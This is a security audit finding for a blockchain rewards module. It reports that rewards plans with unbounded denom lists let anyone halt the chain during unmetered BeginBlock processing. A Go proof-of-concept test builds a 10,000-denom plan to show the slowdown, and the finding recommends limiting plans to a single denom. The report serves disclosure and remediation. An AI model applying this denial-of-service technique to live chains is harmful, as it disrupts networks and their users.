# Unbounded reward denoms in rewards plans can be exploited to permissionlessly halt chain 

## Summary
This bug report discusses an issue with the rewards plans in the code. These plans can have long lists of denoms, which can cause problems during certain functions. This can lead to someone being able to halt the chain by creating a rewards plan with a long list of denoms and distributing them at a specific block. A proof of concept test is provided to demonstrate this issue. The report recommends limiting the rewards plan to only accept a single denom to fix the problem. A fix for this issue has been verified and is being worked on in a pull request. The severity of this bug is considered high risk.

## Details
## Chain Halt via Rewards Plan

## Context

`allocation.go#L165-L177`

## Description

Rewards plans can have arbitrarily long lists of denoms, which are iterated over unboundedly during reward allocation (`AllocateRewards`) and reward plan termination (`TerminateEndedRewardsPlans`) in unmetered BeginBlock execution. As a result, any party can cheaply trigger a chain halt on demand by creating a `RewardsPlan` that has a long list of denoms and begins distributing on the block they want to halt the chain (including the next block).

## Proof of Concept

The following Go test demonstrates an asymmetric chain halt where a single `RewardsPlan` can be created to permissionlessly halt the chain for arbitrarily long periods of time.

```go
func (suite *KeeperTestSuite) TestAllocateRewards_MultiDenomPlan() {
    // Modify these values to simulate different scenarios
    numDenoms := 10000

    // --- Setup ---
    // Cache the context to avoid conflicts
    ctx, _ := suite.ctx.CacheContext()
    // Set up a sample service and operator
    service, _ := suite.setupSampleServiceAndOperator(ctx)
    // Create coins with many denoms for the plan
    amountPerDay := sdk.NewCoins()
    initialDeposit := sdk.NewCoins()
    for i := 0; i < numDenoms; i++ {
        denom := fmt.Sprintf("test/denom/%d", i)
        // Add 1000 of each denom per day
        amountPerDay = amountPerDay.Add(sdk.NewInt64Coin(denom, 1000))
        // Add enough initial deposit to cover rewards for the plan duration
        initialDeposit = initialDeposit.Add(sdk.NewInt64Coin(denom, 365000))
    }
    // Fund the admin account to create rewards plan
    adminAddr := testutil.TestAddress(10000)
    suite.FundAccount(ctx, adminAddr.String(), initialDeposit)
    // Create a delegator to make plan active
    delegatorAddr := testutil.TestAddress(1)
    suite.DelegateService(
        ctx,
        service.ID,
        sdk.NewCoins(sdk.NewInt64Coin("umilk", 100_000_000)),
        delegatorAddr.String(),
        true,
    )
    planStartTime := ctx.BlockTime()
    // Make plan duration very short so it ends immediately after allocation
    planEndTime := planStartTime.Add(1 * time.Hour)
    startTime := time.Now()
    // Create the multi-denom rewards plan
    suite.CreateBasicRewardsPlan(
        ctx,
        service.ID,
        amountPerDay,
        planStartTime,
        planEndTime,
        initialDeposit,
    )
    createDuration := time.Since(startTime)
    fmt.Printf("Created rewards plan with %d denoms in %s\n", numDenoms, createDuration)

    // Advance the context to within the plan's active period for allocation
    ctx = ctx.WithBlockTime(planStartTime.Add(30 * time.Minute))
    startTime = time.Now()
    // --- Trigger BeginBlock chain halt for AllocateRewards ---
    fmt.Println("Commencing BeginBlock call to `AllocateRewards`...")
    err := suite.keeper.AllocateRewards(ctx)
    suite.Require().NoError(err)
    allocateDuration := time.Since(startTime)
    fmt.Printf("AllocateRewards took %s with %d denoms\n", allocateDuration, numDenoms)

    // Advance time past plan end time to trigger termination
    ctx = ctx.WithBlockTime(planEndTime.Add(1 * time.Minute))
    startTime = time.Now()
    // --- Trigger BeginBlock chain halt for TerminateEndedRewardsPlans ---
    fmt.Println("Commencing BeginBlock call to `TerminateEndedRewardsPlans`...")
    err = suite.keeper.TerminateEndedRewardsPlans(ctx)
    suite.Require().NoError(err)
    terminateDuration := time.Since(startTime)
    fmt.Printf("TerminateEndedRewardsPlans took %s with %d denoms\n", terminateDuration, numDenoms)

    totalDuration := allocateDuration + terminateDuration
    fmt.Printf("Total chain halt duration: %s\n", totalDuration)
}
```

## Recommendation

Limit `types.RewardsPlan` to only accept a single denom. The simplest way to do this would be to change the `AmountPerDay` field to be of type `sdk.Coin` instead of `sdk.Coins`.
